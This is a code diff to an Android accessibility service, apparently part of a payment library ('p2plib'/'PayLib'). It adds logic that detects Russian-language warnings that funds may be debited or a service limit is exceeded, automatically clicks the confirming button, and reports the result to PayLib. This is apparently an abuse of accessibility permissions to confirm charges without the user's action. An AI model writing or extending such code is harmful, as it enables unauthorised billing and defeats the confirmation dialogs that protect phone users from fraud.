@@ -9,6 +9,7 @@ import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.example.dkolosovskiy.p2plib.Logger;
+import com.example.dkolosovskiy.p2plib.PayLib;
 
 import static com.example.dkolosovskiy.p2plib.PayLib.flagok;
 
@@ -43,6 +44,10 @@ public class AccessService extends AccessibilityService {
                 str += event.getText().get(1);
             }
             if (str.contains("могут быть списаны средства")) {
+                clickOnButton(event, 0);
+            } if(str.contains("Превышен лимит услуги")){
+                Logger.lg("Превышен лимит услуги");
+                PayLib.getSMSResult(str);
                 clickOnButton(event, 0);
             } else {
                 if (LoginView(event) && notInputText(event)) {
@@ -199,14 +204,13 @@ public class AccessService extends AccessibilityService {
                         }
                     }
                     if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
-                        Logger.lg("nodeButton " + nodeButton.getChildCount());
+                        Logger.lg("nodeButton " + nodeButton.getText());
                         if (nodeButton.getChildCount() == 1) {
                             nodeButton.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         } else {
                             nodeButton.getChild(1).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         }
                     }
-                    Logger.lg("action " + nodeButton.getActionList());
                 }
             }
         }
